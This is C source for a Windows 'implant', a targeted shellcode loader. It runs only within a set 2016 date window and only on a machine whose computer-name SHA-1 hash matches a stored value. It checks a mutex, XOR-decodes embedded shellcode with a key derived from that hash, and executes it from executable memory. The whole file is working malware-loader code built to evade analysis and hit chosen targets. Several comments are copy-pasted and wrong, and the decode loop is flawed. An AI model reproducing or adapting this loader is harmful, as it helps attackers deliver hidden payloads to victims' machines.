#include "implant.h"
#include "config.h"

//////////////////////////////////////////////////////////////////////////////////
//
//   WinMain
//   Entrypoint
//
//////////////////////////////////////////////////////////////////////////////////

int APIENTRY WinMain(_In_ HINSTANCE hInst,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPTSTR    lpCmdLine,
	_In_ int       nCmdShow) {
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

	CheckExecution();
	ExitProcess((UINT)NULL);
}


//////////////////////////////////////////////////////////////////////////////////
//
//   CheckExecution
//   The main function; it performs the various checks and actions
//   and will execute the shellcode if applicable
//
//////////////////////////////////////////////////////////////////////////////////

void CheckExecution() {

	// Perform the date and time check; if it is outside the permitted
	// date, return now
	if (!DateTimeCheck()) return;

	// Check the hash of the computer name against the stored hash.
	// If they are different, return now
	if (!HashCheck()) return;

	// Perform the Mutex check; if it is already running, quit now
	if (!MutexCheck(MUTEX_NAME)) return;


	DecodeShellcode();
	MessageBox(NULL, "Runs", NULL, NULL);

	ExecuteShellcode(&shellcode, shellcodelen);
	
	return;
}


//////////////////////////////////////////////////////////////////////////////////
//
//   HashCheck
//   The main function; it performs the various checks and actions
//   and will execute the shellcode if applicable
//
//////////////////////////////////////////////////////////////////////////////////

unsigned int HashCheck() {
	HGLOBAL *cn;
	HGLOBAL *cnhash;
	unsigned int ret;

	ret = FALSE;

	// Check the hash of the computer name
	if (cn = GetComputerInfo(ComputerNamePhysicalNetBIOS)) {
		if (cnhash = GenerateHash((char *) cn, strlen(cn))) {
			if (!memcmp(cnhash, &hashSHA1ComputerName, hashSHA1ComputerNamelen)) {
				ret = TRUE;
			}
			free(cnhash);
		}
		free(cn);
	}

	return ret;
}



//////////////////////////////////////////////////////////////////////////////////
//
//   DecodeShellcode
//   This function xor's the shellcode against a concatenated hash 
//
//////////////////////////////////////////////////////////////////////////////////

void DecodeShellcode() {
	HGLOBAL *cn;
	HGLOBAL *cnhash;
	unsigned int ret;

	unsigned int sc = 0; // Shellcode position marker
	unsigned int hc = 0; // Hash position marker

	// Get the computer name (to be used as a decryption key)
	if (cn = GetComputerInfo(ComputerNamePhysicalNetBIOS)) {
		if (cnhash = GenerateHash(cn, strlen(cn))) {
			
			// Loop through the shellcode
			for (sc = 0; sc < shellcodelen; sc++) {
				
				for (hc = 0; hc < HASH_LEN; hc++) {
					shellcode[sc] ^= (unsigned char) cnhash[hc];
				}

				// Loop through the hash
				if (hc == HASH_LEN - 1) {
					hc = 0;
				} else {
					hc++;
				}
			}
			free(cnhash);
		}
		free(cn);
	}

	return;
}



//////////////////////////////////////////////////////////////////////////////////
//
//   MutexCheck
//   Returns FALSE if we should bail out now because of the mutex
//   or TRUE if we can carry on
//
//////////////////////////////////////////////////////////////////////////////////
unsigned int MutexCheck(const char *name) {
	HANDLE mutex = NULL, error = NULL;

	mutex = CreateMutex(NULL, TRUE, name);
	if (mutex == NULL) {
		// Error creating the mutex. This could be because
		// we are trying to create a Global mutex and it exists
		// already.
		return FALSE;
	}
	else {
		// Handle has been returned
		error = (HANDLE)GetLastError();
		if (error == (HANDLE)ERROR_ALREADY_EXISTS) {
			// Mutex already exists
			return FALSE;
		}
		else {
			return TRUE;
		}
	}
}



//////////////////////////////////////////////////////////////////////////////////
//
//   DateTimeCheck()
//   Returns FALSE if we should bail out now because of the mutex
//   or TRUE if we can carry on
//
//////////////////////////////////////////////////////////////////////////////////
unsigned int DateTimeCheck() {

	SYSTEMTIME ct;
	GetSystemTime(&ct);

	// Check that we are between January and July 2016
	if ((ct.wYear == 2016 && ct.wMonth <= 7) && (ct.wYear == 2016 && ct.wMonth >= 1)) {
		return TRUE;
	} else {
		return FALSE;
	}

}



//////////////////////////////////////////////////////////////////////////////////
//
//   GetComputerInfo(nametype)
//   Returns FALSE if we should bail out now because of the mutex
//   or TRUE if we can carry on
//
//////////////////////////////////////////////////////////////////////////////////
HGLOBAL * GetComputerInfo(COMPUTER_NAME_FORMAT nametype) {
	
	HGLOBAL *ci;
	DWORD len = 0;

	GetComputerNameEx(nametype, NULL, &len);
	if (len) {
		if (ci = calloc(len, 1)) {
			if (GetComputerNameEx(nametype, ci, &len)) {
				return ci;
			}
		}
	}
	return NULL;

}




//////////////////////////////////////////////////////////////////////////////////
//
//   GenerateHash()
//   Returns a pointer to a buffer containing a SHA1 hash or FALSE if there is a problem
//
//////////////////////////////////////////////////////////////////////////////////
HGLOBAL GenerateHash(BYTE *src, unsigned int len) {
	
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	DWORD hash_size_needed;
	DWORD hash_size_needed_len;
	HGLOBAL hash_value;
	HGLOBAL ret = { 0 };

	// Acquire a handle to the general key container
	if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, NULL)) {

		// Generate a handle to the SHA1 hash type that we want
		if (CryptCreateHash(hProv, CALG_SHA1, NULL, NULL, &hHash)) {

			// Hash the data
			if (CryptHashData(hHash, src, len, NULL)) {

				// We know it is SHA-1 and therefore 160-bit but I left this in to make it
				// easier and more resilient to changes in hash algorithm choice etc. Therefore,
				// request the hash size from the CryptoAPI and make sure its 20 bytes (160 bit)
				hash_size_needed_len = 4;
				if (CryptGetHashParam(hHash, HP_HASHSIZE, &hash_size_needed, &hash_size_needed_len, NULL) && hash_size_needed == 20) {

					// Now allocate memory for the hash
					if (hash_value = calloc(hash_size_needed, 1)) {

						if (CryptGetHashParam(hHash, HP_HASHVAL, hash_value, &hash_size_needed, NULL)) {
							ret = hash_value;
						}

					}
				}

			}

			// Clean up
			CryptDestroyHash(hHash);
		}

		// Clean up
		CryptReleaseContext(hProv, NULL);
	} 
	return (HGLOBAL) ret;
}



void ExecuteShellcode(BYTE *buf, unsigned int size) {

	char *buffer;
	void(*sc)();

	buffer = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(buffer, buf, size);
	sc = (void(*)()) buffer;
	sc();

}